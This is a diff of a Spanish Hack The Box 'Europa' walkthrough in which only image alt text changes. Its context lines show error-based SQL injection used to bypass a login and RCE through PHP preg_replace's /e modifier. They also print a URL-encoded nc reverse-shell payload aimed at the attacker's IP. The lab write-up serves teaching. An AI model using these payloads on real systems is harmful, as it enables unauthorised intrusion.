@@ -120,7 +120,7 @@ https://admin-portal.europacorp.htb/login.php [200 OK] Apache[2.4.18], Bootstrap
 
 Vemos que para la mayoria, se tiene por título **Apache2 Ubuntu Default Page: It works**; lo que hace referencia a la página default de **Apache**.  Para el dominio `admin-portal.europacorp.htb`, se observa una redirección hacia el recurso `login.php`; por lo que le echamos un ojo para visualizar el contenido.
 
-![](/assets/images/htb-europa/europa_web.png)
+![""](/assets/images/htb-europa/europa_web.png)
 
 De la información reportada por `whatweb`, no se obseva el uso de algún gestor de contenido, por lo que el sitio web podría ser *hecho a mano*. Como podemos observar en la imagen anterior, es necesario contar con una dirección de correo electrónica; pensando un poco vemos que la solicitud se hace a través del puerto 443, por lo que es posible que el certificado del sitio muestre algo de información relevante.
 
@@ -187,39 +187,39 @@ En el resultado obtenido del comando `curl`, vemos una posible dirección de cor
 
 Podríamos tratar de validar primeramente contraseñas más comunes, como: *admin*, *password*, *admin123*, etc. Vemos que no tenemos éxito, por lo que ahora podríamos tratar inyecciones sql, como agregando el caracter **'** al principio del correo electrónico; es decir, `'admin@europacorp.htb`.
 
-![](/assets/images/htb-europa/europa_sql.png)
+![""](/assets/images/htb-europa/europa_sql.png)
 
 Vemos que el sitio web es vulnerable a ataques de tipo SQLi basados en errores. Para facilitar el trabajo, vamos a hacer uso de la herramienta **Burp Suite** en el parte del *Repeater*.
 
-![](/assets/images/htb-europa/europa_burp.png)
+![""](/assets/images/htb-europa/europa_burp.png)
 
 Como la información se nos desplega, es decir, lo podemos ver y checar la información; podriamos tratar de obtener datos de la base de datos; primeramente utilizando `' order by x-- -`, en donde `x` representa un dígito asociado al número de columnas de la tabla; por lo tanto podríamos probar con 10 y luego ir disminuyendo hasta que veamos un resultado diferente en la respueta del lado del servidor. (**Nota**: Es importante poner la sentencia sql en formato url encode mediante la selección de dicha sentencia y tecleamos ctrl + u).
 
 Para cuando x toma el valor de 5, vemos que se nos habilita un botón en la parte superior indicando una redirección.
 
-![](/assets/images/htb-europa/europa_burp1.png)
+![""](/assets/images/htb-europa/europa_burp1.png)
 
 Le damos click al botón **Follow redirection** y de alguna forma extraña ya nos encontramos dentro del panel de administración. Podemos quitar el proxy de **Burp Suite** y checando nuestro explorador, vemos la página de inicio.
 
-![](/assets/images/htb-europa/europa_acceso.png)
+![""](/assets/images/htb-europa/europa_acceso.png)
 
 Analizando un poco el panel del sitio web, no vemos nada interesante, sólo en la opción *Tools* en donde vemos *OpenVPN Config Generator* y nos solicita ingresar una dirección IP.
 
-![](/assets/images/htb-europa/europa_ip.png)
+![""](/assets/images/htb-europa/europa_ip.png)
 
 Si ingresamos una dirección IP o cualquier cadena de texto, vemos que esta se reemplaza dentro de la configuración del valor **"ip_address"**.
 
-![](/assets/images/htb-europa/europa_k4miyo.png)
+![""](/assets/images/htb-europa/europa_k4miyo.png)
 
 Podríamos tratar de inyectar comando html o scripts; pero de poco nos va a servir. Vamos a checar como se realizar la solicitud mediante **Burp Suite**.
 
-![](/assets/images/htb-europa/europa_k4miyo1.png)
+![""](/assets/images/htb-europa/europa_k4miyo1.png)
 
 Vemos en la solicitud se envía `pattern`, `ipaddress` y `text`. Del lado del servidor, podemos ver que donde antes estaba **"ip_address"** ahora vemos nuestro texto. (**Nota**: Para lograr que la solicitud se vea clara, seleccionamos los parámetros que se manda y hacemos ctrl + shift + u).
 
 Como nos podemos dar cuenta, se hace un reemplazo de lo que se encuentra en `pattern` por lo que se encuentra en `ipaddress`. Investigando un poco, vemos que existe un artículo en [bitquark.co.uk](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace) en donde se expone de los peligros inesperados de preg_replace (). Leyendo un poco, vemos que se tiene un parámetro `e` agregado del lado del `pattern` y un comando a nivel de sistema del lado de `ipaddress`; por lo que podríamos probar.
 
-![](/assets/images/htb-europa/europa_rce.png)
+![""](/assets/images/htb-europa/europa_rce.png)
 
 Vemos que tenemos ejecución de comando a nivel de sistema, ahora tenemos que entablarnos una reverse shell para ganar acceso al sistema. Ocupamos nuestro sitio de confianza [pentestmonkey.net](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet); pero hay que recordar que debemos url  encodear el comando que para este caso se utilizó:
 
@@ -233,7 +233,7 @@ Por lo que al url encodearlo quedaría de la siguiente manera:
 system('rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.8+443+>/tmp/f')
 ```
 
-![](/assets/images/htb-europa/europa_rce1.png)
+![""](/assets/images/htb-europa/europa_rce1.png)
 
 ```bash
 ❯ nc -nlvp 443
